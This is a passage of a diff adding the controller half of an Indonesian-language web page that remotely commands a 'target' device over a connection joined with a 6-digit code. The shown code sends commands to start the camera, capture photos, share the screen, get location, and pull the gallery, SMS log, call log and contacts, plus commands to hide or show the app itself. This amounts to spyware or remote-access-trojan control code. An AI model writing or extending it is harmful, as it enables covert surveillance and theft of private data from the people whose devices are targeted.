+                addLog(controllerLogDiv, `Target: Aplikasi ${data.app} diblokir (simulasi)`);
+                setResult(`🚫 Aplikasi ${data.app} diblokir (SIMULASI)`);
+            } else if (data.type === 'cameraStatus') {
+                addLog(controllerLogDiv, `Kamera target: ${data.status ? "ON" : "OFF"}`);
+            } else if (data.type === 'screenShare') {
+                addLog(controllerLogDiv, `Screen share target: ${data.status ? "AKTIF" : "OFF"}`);
+            } else if (data.type === 'error') {
+                addLog(controllerLogDiv, `Error target: ${data.msg}`, true);
+                setResult(`❌ Error: ${data.msg}`);
+            }
+        });
+    }
+
+    function sendCommand(cmd, payload={}) {
+        if (conn && conn.open) {
+            conn.send({ type: 'command', cmd: cmd, payload: payload });
+            addLog(controllerLogDiv, `📤 Perintah dikirim: ${cmd}`);
+        } else {
+            addLog(controllerLogDiv, "Tidak terhubung ke target!", true);
+        }
+    }
+
+    // ----- Controller Events -----
+    document.getElementById('ctrlStartCam').onclick = () => sendCommand('startCamera');
+    document.getElementById('ctrlFlash').onclick = () => sendCommand('toggleFlash');
+    document.getElementById('ctrlSwitchCam').onclick = () => sendCommand('switchCamera');
+    document.getElementById('ctrlCapture').onclick = () => sendCommand('capture');
+    document.getElementById('ctrlLoc').onclick = () => sendCommand('getLocation');
+    document.getElementById('ctrlSOS').onclick = () => sendCommand('sos');
+    document.getElementById('ctrlLock').onclick = () => sendCommand('lockHard');
+    document.getElementById('ctrlUnlock').onclick = () => sendCommand('unlock');
+    document.getElementById('ctrlSound').onclick = () => {
+        const freq = prompt('Frekuensi (Hz):', '880');
+        if (freq) sendCommand('playSound', { freq: parseInt(freq) });
+    };
+    document.getElementById('ctrlVideo').onclick = () => {
+        const url = prompt('URL video mp4:', 'https://www.w3schools.com/html/mov_bbb.mp4');
+        if (url) sendCommand('playVideo', { url: url });
+    };
+    document.getElementById('ctrlWallpaper').onclick = () => {
+        const color = prompt('Warna (hex):', '#ff00ff');
+        if (color) sendCommand('setWallpaper', { color: color });
+    };
+    document.getElementById('ctrlTheme').onclick = () => {
+        const theme = prompt('Tema (dark/light):', 'dark');
+        if (theme) sendCommand('setTheme', { theme: theme });
+    };
+    document.getElementById('ctrlGallery').onclick = () => sendCommand('getGallery');
+    document.getElementById('ctrlSysInfo').onclick = () => sendCommand('getSysInfo');
+    document.getElementById('ctrlScreen').onclick = () => sendCommand('startScreenShare');
+    document.getElementById('ctrlSmsLog').onclick = () => sendCommand('getSmsLog');
+    document.getElementById('ctrlCallLog').onclick = () => sendCommand('getCallLog');
+    document.getElementById('ctrlContact').onclick = () => sendCommand('getContacts');
+    document.getElementById('ctrlHideApk').onclick = () => sendCommand('hideApk');
+    document.getElementById('ctrlShowApk').onclick = () => sendCommand('showApk');
+    document.getElementById('ctrlBlockApp').onclick = () => {
+        const app = prompt('Nama aplikasi (simulasi):', 'com.example.app');
+        if (app) sendCommand('blockApp', { app: app });
+    };
+
+    connectBtn.onclick = () => {
+        const code = targetCodeInput.value.trim();
+        if (!code || code.length!==6 || isNaN(code)) {
+            alert('Masukkan kode 6 digit!');
+            return;
+        }
+        connectToTarget(code);
+    };
+
+    // ==================== SWITCH MODE ====================
+    function setMode(mode) {
+        currentMode = mode;
+        if (mode === 'target') {
+            targetPanel.style.display = 'block';
+            controllerPanel.style.display = 'none';
+            initTargetMode();
+        } else {
+            targetPanel.style.display = 'none';
+            controllerPanel.style.display = 'block';
+            initControllerMode();
+        }
+        modeBtns.forEach(btn => {
+            btn.classList.toggle('active', btn.dataset.mode === mode);
+        });
+    }
+
+    modeBtns.forEach(btn => {
+        btn.addEventListener('click', () => setMode(btn.dataset.mode));
+    });
+
+    setMode('target');
+</script>
+</body>
+</html>
